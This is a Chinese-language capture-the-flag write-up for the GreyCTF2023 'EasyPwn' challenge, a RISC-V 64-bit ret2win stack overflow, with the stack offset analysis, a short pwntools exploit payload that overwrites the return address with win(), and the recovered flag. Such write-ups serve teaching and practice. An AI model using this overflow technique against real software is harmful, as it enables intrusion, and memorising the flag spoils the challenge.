# GreyCTF2023 EasyPwn

## 题目简述

这是一个 RISC-V 64 位 ret2win。`main` 只有 8 字节数组，却执行 `read(0, str, 1024)`；二进制未启用 PIE 和栈 canary，且存在 `win()`，其内部调用 `system("cat flag.txt")`。

## 解题过程

反汇编可见 `main` 分配 32 字节栈帧，输入缓冲区位于 `sp+8`，保存的返回地址位于 `sp+24`，所以从缓冲区到 `ra` 的偏移为 16 字节。`win` 的固定地址是 `0x106a6`：

```python
from pwn import *

context.arch = "riscv64"
win = 0x106a6
payload = b"A" * 16 + p64(win)
io.send(payload)
```

仓库中的 `pwn.txt` 采用更容错的写法：连续重复 `p64(0x106a6)`，这样偏移 16 处同样落入 `win`。函数返回后直接输出：

```text
grey{d1d_y0u_run_th3_3x3ut4b1e?_230943209rj03jrr23}
```

程序还存在 `printf(str)` 格式化字符串问题，但本题已有无 canary、无 PIE 的直接返回地址覆盖，无需引入额外泄露链。

## 方法总结

面对陌生架构，先确认 ABI 中返回地址的保存位置，而不要机械套用 x86 偏移。RISC-V 的 `ra` 在函数序言中保存到栈上，仍可用普通栈溢出覆盖。利用设计应选择最短充分原语：已有固定地址 `win` 时，格式化字符串漏洞只是旁支。
